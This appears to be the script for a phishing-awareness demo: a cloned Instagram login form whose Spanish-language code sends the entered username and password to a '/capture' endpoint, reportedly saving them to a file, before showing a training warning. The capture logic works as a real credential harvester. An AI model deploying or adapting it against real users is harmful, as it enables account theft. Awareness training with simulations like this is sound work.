// Educational Phishing Demonstration - Instagram Clone
// This is for EDUCATIONAL PURPOSES ONLY

document.getElementById("loginForm").addEventListener("submit", function (e) {
  e.preventDefault();

  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  // Enviar datos al servidor para ser guardados
  fetch('/capture', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      username: username,
      password: password
    })
  })
    .then(response => response.json())
    .then(data => {
      console.log("Datos enviados al servidor");

      // Mostrar modal educativo después de simular la captura
      const modal = document.createElement("div");
      modal.className = "warning-modal active";
      modal.innerHTML = `
      <div class="warning-content">
        <div class="warning-icon">⚠️</div>
        <h2>¡ALERTA DE SEGURIDAD!</h2>
        <p><strong>Acabas de caer en una simulación de phishing educativa.</strong></p>
        
        <h3>📧 Datos capturados en el servidor:</h3>
        <p style="background: #f0f0f0; padding: 10px; border-radius: 6px; font-family: monospace; word-break: break-all;">
          Los datos han sido guardados en 'data_captured.txt' para fines de métricas de calidad.
        </p>
        
        <h3>🚨 Señales de alerta que debiste notar:</h3>
        <ul>
          <li><strong>URL sospechosa:</strong> No es instagram.com oficial</li>
          <li><strong>Dominio incorrecto:</strong> Verifica siempre la barra de direcciones</li>
          <li><strong>Urgencia artificial:</strong> El correo simulado te presionó a actuar rápido</li>
        </ul>
        
        <button class="close-btn" onclick="window.location.href='https://www.instagram.com'">Volver a Instagram Real</button>
      </div>
    `;
      document.body.appendChild(modal);
    })
    .catch(error => {
      console.error('Error:', error);
      alert("Error de conexión con el backend educativo.");
    });
});
